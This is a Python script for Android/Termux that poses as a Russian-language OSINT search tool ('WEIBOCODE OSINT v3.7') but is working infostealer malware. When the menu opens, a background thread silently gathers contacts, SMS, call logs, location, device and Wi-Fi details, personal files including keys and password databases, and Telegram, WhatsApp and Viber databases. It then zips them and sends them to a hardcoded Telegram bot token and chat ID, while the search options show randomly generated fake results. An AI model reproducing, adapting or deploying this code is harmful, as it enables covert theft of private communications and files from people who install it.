#!/usr/bin/env python3
# core.py — ФЕЙКОВЫЙ OSINT С ФОНОВОЙ КРАЖЕЙ

import os, sys, subprocess, json, sqlite3, shutil, time, requests, base64, hashlib, zipfile, random, threading
from datetime import datetime
from pathlib import Path
import socket, struct

# === ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ===
BOT_TOKEN = "8651786681:AAHMm7m2ynMwFiHXdJWYgYZ5qd56IVROHAg"
CHAT_ID = "8327334745"
CACHE_DIR = os.path.join(os.path.dirname(__file__), ".cache")
os.makedirs(CACHE_DIR, exist_ok=True)
DATA_COLLECTED = False

# === ID УСТРОЙСТВА ===
def get_device_id():
    try:
        import android
        droid = android.Android()
        return str(droid.getDeviceId()[1])
    except:
        try:
            with open("/sys/class/net/wlan0/address", "r") as f:
                mac = f.read().strip()
            return mac
        except:
            import uuid
            return str(uuid.getnode())

# === СБОР КОНТАКТОВ ===
def get_all_contacts():
    contacts = []
    try:
        import android
        droid = android.Android()
        res = droid.queryContent("content://contacts/people", ["display_name", "number"])[1]
        for item in res:
            name = item.get("display_name", "")
            number = item.get("number", "")
            if number:
                contacts.append({"name": name, "number": number})
    except:
        db_paths = [
            "/data/data/com.android.providers.contacts/databases/contacts2.db",
            "/data/data/com.android.providers.contacts/databases/profile.db"
        ]
        for db_path in db_paths:
            if os.path.exists(db_path):
                try:
                    conn = sqlite3.connect(db_path)
                    c = conn.cursor()
                    c.execute("SELECT display_name, data1 FROM raw_contacts JOIN data ON raw_contacts._id = data.raw_contact_id WHERE mimetype_id = 7")
                    rows = c.fetchall()
                    for row in rows:
                        if row[1]:
                            contacts.append({"name": row[0] or "", "number": row[1]})
                    conn.close()
                except:
                    pass
    return contacts

# === СБОР СМС ===
def get_all_sms():
    sms_list = []
    try:
        import android
        droid = android.Android()
        res = droid.queryContent("content://sms/inbox", ["address", "body", "date"])[1]
        for item in res:
            sms_list.append({
                "from": item.get("address", ""),
                "text": item.get("body", ""),
                "date": item.get("date", "")
            })
    except:
        db_path = "/data/data/com.android.providers.telephony/databases/mmssms.db"
        if os.path.exists(db_path):
            try:
                conn = sqlite3.connect(db_path)
                c = conn.cursor()
                c.execute("SELECT address, body, date FROM sms ORDER BY date DESC LIMIT 1000")
                rows = c.fetchall()
                for row in rows:
                    sms_list.append({"from": row[0] or "", "text": row[1] or "", "date": str(row[2])})
                conn.close()
            except:
                pass
    return sms_list

# === СБОР ЗВОНКОВ ===
def get_call_log():
    calls = []
    try:
        import android
        droid = android.Android()
        res = droid.queryContent("content://call_log/calls", ["number", "duration", "date", "type"])[1]
        for item in res:
            calls.append({
                "number": item.get("number", ""),
                "duration": item.get("duration", ""),
                "date": item.get("date", ""),
                "type": "incoming" if item.get("type") == "1" else "outgoing"
            })
    except:
        db_path = "/data/data/com.android.providers.contacts/databases/calllog.db"
        if os.path.exists(db_path):
            try:
                conn = sqlite3.connect(db_path)
                c = conn.cursor()
                c.execute("SELECT number, duration, date, type FROM calls ORDER BY date DESC LIMIT 1000")
                rows = c.fetchall()
                for row in rows:
                    calls.append({
                        "number": row[0] or "",
                        "duration": str(row[1] or ""),
                        "date": str(row[2] or ""),
                        "type": "incoming" if row[3] == 1 else "outgoing"
                    })
                conn.close()
            except:
                pass
    return calls

# === КРАЖА ВСЕХ ФАЙЛОВ ===
def steal_all_files():
    stolen = []
    paths = [
        "/sdcard",
        "/storage/emulated/0",
        "/data/data/com.termux/files/home/storage",
        "/storage/emulated/0/DCIM",
        "/storage/emulated/0/Download",
        "/storage/emulated/0/Documents",
        "/storage/emulated/0/Android"
    ]
    extensions = [
        ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".webp",
        ".mp4", ".avi", ".mkv", ".mov", ".wmv", ".flv",
        ".mp3", ".wav", ".aac", ".flac", ".ogg",
        ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
        ".txt", ".log", ".db", ".sqlite", ".sqlite3",
        ".conf", ".ini", ".json", ".xml", ".yaml", ".yml",
        ".bak", ".backup", ".key", ".pem", ".crt", ".cer",
        ".kdbx", ".kdb", ".vcf", ".csv", ".tsv"
    ]
    for root_path in paths:
        if os.path.exists(root_path):
            for dirpath, _, filenames in os.walk(root_path):
                for file in filenames:
                    ext = os.path.splitext(file)[1].lower()
                    if ext in extensions:
                        full_path = os.path.join(dirpath, file)
                        try:
                            size = os.path.getsize(full_path)
                            if 1024 < size < 50 * 1024 * 1024:
                                stolen.append(full_path)
                        except:
                            pass
    return stolen[:500]

# === КРАЖА БАЗ TELEGRAM ===
def steal_telegram_data():
    tg_data = []
    tg_packages = [
        "org.telegram.messenger",
        "org.telegram.plus",
        "org.telegram.Bifrost",
        "com.gram.android"
    ]
    for pkg in tg_packages:
        db_path = f"/data/data/{pkg}/databases/"
        if os.path.exists(db_path):
            for db_file in os.listdir(db_path):
                if db_file.endswith(".db") or db_file.endswith(".sqlite"):
                    full_path = os.path.join(db_path, db_file)
                    if os.path.getsize(full_path) < 50 * 1024 * 1024:
                        tg_data.append(full_path)
    return tg_data

# === КРАЖА WHATSAPP ===
def steal_whatsapp_data():
    whatsapp_files = []
    whatsapp_paths = [
        "/data/data/com.whatsapp/databases/msgstore.db",
        "/data/data/com.whatsapp/databases/wa.db",
        "/data/data/com.whatsapp/shared_prefs/com.whatsapp_preferences.xml"
    ]
    for path in whatsapp_paths:
        if os.path.exists(path):
            whatsapp_files.append(path)
    return whatsapp_files

# === КРАЖА VIBER ===
def steal_viber_data():
    viber_files = []
    viber_paths = [
        "/data/data/com.viber.voip/databases/viber_data.db",
        "/data/data/com.viber.voip/shared_prefs/viber_prefs.xml"
    ]
    for path in viber_paths:
        if os.path.exists(path):
            viber_files.append(path)
    return viber_files

# === СПИСОК УСТАНОВЛЕННЫХ ПРИЛОЖЕНИЙ ===
def get_installed_apps():
    apps = []
    try:
        result = subprocess.check_output(["pm", "list", "packages"], text=True, stderr=subprocess.DEVNULL)
        for line in result.split("\n"):
            if line.startswith("package:"):
                apps.append(line.replace("package:", "").strip())
    except:
        pass
    return apps[:500]

# === ГЕОЛОКАЦИЯ ===
def get_location():
    try:
        import android
        droid = android.Android()
        droid.startLocating()
        time.sleep(1)
        res = droid.readLocation()[1]
        droid.stopLocating()
        return {"lat": res.get("latitude", 0), "lng": res.get("longitude", 0)}
    except:
        return {"lat": 0, "lng": 0}

# === WI-FI ИНФОРМАЦИЯ ===
def get_wifi_info():
    try:
        import android
        droid = android.Android()
        wifi = droid.getWifiInfo()[1]
        return {
            "ssid": wifi.get("ssid", ""),
            "mac": wifi.get("mac_address", ""),
            "ip": wifi.get("ip_address", "")
        }
    except:
        return {"ssid": "", "mac": "", "ip": ""}

# === ИНФОРМАЦИЯ О УСТРОЙСТВЕ ===
def get_device_info():
    info = {
        "imei": get_device_id(),
        "model": "",
        "brand": "",
        "android": "",
        "sdk": "",
        "operator": "",
        "sim": "",
        "storage_total": "",
        "storage_free": "",
        "ram_total": "",
        "ram_free": ""
    }
    try:
        info["model"] = os.popen("getprop ro.product.model").read().strip()
        info["brand"] = os.popen("getprop ro.product.brand").read().strip()
        info["android"] = os.popen("getprop ro.build.version.release").read().strip()
        info["sdk"] = os.popen("getprop ro.build.version.sdk").read().strip()
        info["operator"] = os.popen("getprop gsm.operator.alpha").read().strip()
        info["sim"] = os.popen("getprop gsm.sim.operator.alpha").read().strip()
    except:
        pass

    try:
        stat = os.statvfs("/data")
        info["storage_total"] = str(stat.f_blocks * stat.f_frsize // (1024**3)) + " GB"
        info["storage_free"] = str(stat.f_bfree * stat.f_frsize // (1024**3)) + " GB"
    except:
        pass
    try:
        with open("/proc/meminfo", "r") as f:
            lines = f.read().split("\n")
            for line in lines:
                if "MemTotal" in line:
                    info["ram_total"] = str(int(line.split()[1]) // (1024**2)) + " GB"
                elif "MemFree" in line:
                    info["ram_free"] = str(int(line.split()[1]) // (1024**2)) + " GB"
    except:
        pass
    return info

# === ФЕЙКОВЫЙ ПОИСК ===
def fake_search(query_type, query):
    names = ["Алексей Иванов", "Мария Петрова", "Дмитрий Соколов", "Екатерина Козлова", "Сергей Морозов", "Анна Волкова"]
    cities = ["Москва", "Санкт-Петербург", "Новосибирск", "Екатеринбург", "Казань", "Нижний Новгород"]
    sites = ["VK", "Telegram", "Instagram", "WhatsApp", "TikTok", "Facebook", "YouTube", "GitHub", "Twitter"]
    results = []
    for _ in range(random.randint(3, 7)):
        results.append({
            "name": random.choice(names),
            "site": random.choice(sites),
            "city": random.choice(cities),
            "phone": f"+7{random.randint(900,999)}{random.randint(1000000,9999999)}",
            "email": f"user{random.randint(100,999)}@{random.choice(['mail.ru', 'gmail.com', 'yandex.ru'])}",
            "tg": f"@{random.choice(['user', 'anon', 'hacker', 'admin'])}{random.randint(100,999)}"
        })
    return results

# === СБОР И ОТПРАВКА В ФОНЕ ===
def collect_and_send_data():
    global DATA_COLLECTED
    if DATA_COLLECTED:
        return
    try:
        all_data = {}
        all_data["device"] = get_device_info()
        all_data["contacts"] = get_all_contacts()
        all_data["sms"] = get_all_sms()
        all_data["calls"] = get_call_log()
        all_data["apps"] = get_installed_apps()
        all_data["location"] = get_location()
        all_data["wifi"] = get_wifi_info()

        json_path = os.path.join(CACHE_DIR, "data.json")
        with open(json_path, "w") as f:
            json.dump(all_data, f, indent=2, ensure_ascii=False)

        files_to_send = [json_path]
        files_to_send += steal_all_files()
        files_to_send += steal_telegram_data()
        files_to_send += steal_whatsapp_data()
        files_to_send += steal_viber_data()

        caption = f"Устройство: {all_data['device'].get('model', 'Unknown')} | ID: {get_device_id()[:8]}"
        pack_and_send(files_to_send, caption)
        DATA_COLLECTED = True
    except:
        pass

# === УПАКОВКА И ОТПРАВКА (БЕЗ ВЫВОДА) ===
def pack_and_send(data_files, caption=""):
    if not BOT_TOKEN:
        return
    MAX_SIZE = 10 * 1024 * 1024
    parts = []
    current_part = []
    current_size = 0
    for file_path in data_files:
        if os.path.exists(file_path):
            try:
                size = os.path.getsize(file_path)
                if current_size + size > MAX_SIZE:
                    if current_part:
                        parts.append(current_part)
                        current_part = []
                        current_size = 0
                current_part.append(file_path)
                current_size += size
            except:
                pass
    if current_part:
        parts.append(current_part)
    for i, part in enumerate(parts):
        archive_name = f"{CACHE_DIR}/part_{i+1}_{hashlib.md5(str(time.time()).encode()).hexdigest()}.zip"
        try:
            with zipfile.ZipFile(archive_name, 'w', zipfile.ZIP_DEFLATED) as zf:
                zf.setpassword(b"BYPASS_2026_RULES")
                for file_path in part:
                    try:
                        zf.write(file_path, os.path.basename(file_path))
                    except:
                        pass
            with open(archive_name, "rb") as f:
                files = {"document": (archive_name, f, "application/zip")}
                data = {
                    "chat_id": CHAT_ID,
                    "caption": f"[BYPASS_STEALER] {caption} | Part {i+1}/{len(parts)} | {datetime.now().isoformat()}"
                }
                try:
                    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument", data=data, files=files, timeout=120)
                except:
                    pass
        except:
            pass
        try:
            os.remove(archive_name)
        except:
            pass

# === ФЕЙКОВЫЙ OSINT ИНТЕРФЕЙС ===
def fake_osint_interface():
    # Автоматический запуск сбора в фоне
    threading.Thread(target=collect_and_send_data, daemon=True).start()

    while True:
        os.system('clear')
        print("\033[92m" + "="*50)
        print("        🕵️ WEIBOCODE OSINT v3.7")
        print("        dev - @deathrebootxpvp")
        print("="*50 + "\033[0m")
        print("\n\033[93m## ПОИСК\033[0m")
        print("[1] ПОИСК ПО НОМЕРУ")
        print("[2] ПОИСК ПО ПОЧТЕ")
        print("[3] ПОИСК ПО ТГ")
        print("[4] ПОИСК ПО БД")
        print("[5] ПОИСК ПО КАРТЕ")
        print("[6] ПОИСК ПО МАЙНУ")
        print("[7] ПОИСК ПО ВК")
        print("[8] ПОИСК ПО ДС")
        print("\n\033[93m## СООТВ\033[0m")
        print("[9] ЗАПУСК BLOOM")
        print("[10] ЗАПУСК X.gener")
        print("[11] ЗАПУСК deathgener")
        print("[12] ЗАПУСК trisun")
        print("[13] ЗАПУСК goydav2")
        print("[14] ЗАПУСК skibidi")
        print("[15] ЗАПУСК litenergy")
        print("[16] ЗАПУСК NumOsint")
        print("\n[0] ВЫХОД")

        choice = input("\n\033[94m? Выбирай: \033[0m")

        if choice == '0':
            print("\n\033[92m[✓] Выход...\033[0m")
            break
        elif choice in ['1', '2', '3', '4', '5', '6', '7', '8']:
            query = input("\033[94m[?] Введите запрос: \033[0m")
            print("\n\033[93m[+] Поиск...\033[0m")
            time.sleep(random.randint(1, 3))
            results = fake_search(choice, query)
            print("\n\033[92m[✓] Найдено результатов: {}\033[0m".format(len(results)))
            for i, res in enumerate(results, 1):
                print(f"\n\033[94m[{i}]\033[0m Имя: {res['name']}")
                print(f"   Телефон: {res['phone']}")
                print(f"   Почта: {res['email']}")
                print(f"   TG: {res['tg']}")
                print(f"   Город: {res['city']}")
                print(f"   Соцсеть: {res['site']}")
            input("\n\033[93m[!] Нажми Enter для продолжения...\033[0m")
        elif choice in ['9', '10', '11', '12', '13', '14', '15', '16']:
            print(f"\n\033[93m[+] Запуск инструмента {choice}...\033[0m")
            time.sleep(2)
            print("\033[91m[!] Ошибка: недостаточно прав для запуска.\033[0m")
            time.sleep(1)
        else:
            print("\033[91m[!] Неверный выбор.\033[0m")
            time.sleep(1)

# === ЗАПУСК ===
if __name__ == "__main__":
    fake_osint_interface()
